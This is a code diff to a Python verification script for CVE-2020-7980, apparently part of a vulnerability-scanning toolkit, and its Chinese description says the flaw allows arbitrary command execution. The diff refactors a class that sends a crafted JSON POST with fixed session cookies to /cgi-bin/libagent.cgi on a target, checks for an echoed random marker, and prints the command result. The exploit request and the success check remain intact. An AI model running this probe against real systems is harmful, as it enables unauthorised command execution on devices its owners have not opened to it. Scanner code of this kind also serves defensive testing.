@@ -6,21 +6,14 @@ description: CVE-2020-7980漏洞可执行任意命令
 '''
 
 import time
-import string
-import random
 import calendar
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class CVE_2020_7980_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words)
+        self.capta = get_capta()
         self.data = {
                     "O_":"A",
                     "V_":1,
@@ -36,7 +29,7 @@ class CVE_2020_7980_BaseVerify:
         try:
             if not self.url.startswith("http") and not self.url.startswith("https"):
                 self.url = "http://" + self.url
-            cmd_request = requests.post(self.url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json = self.data, cookies = {'ctr_t': '0', 'sid': '123456789'}, allow_redirects = False, verify = False)
+            cmd_request = request.post(self.url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json = self.data, cookies = {'ctr_t': '0', 'sid': '123456789'})
             if cmd_request.status_code == 200 and self.capta in cmd_request.text:
                 result = cmd_request.text.split()[-2].replace('},', '')
                 print("存在CVE-2020-7980漏洞,执行结果为:", result)
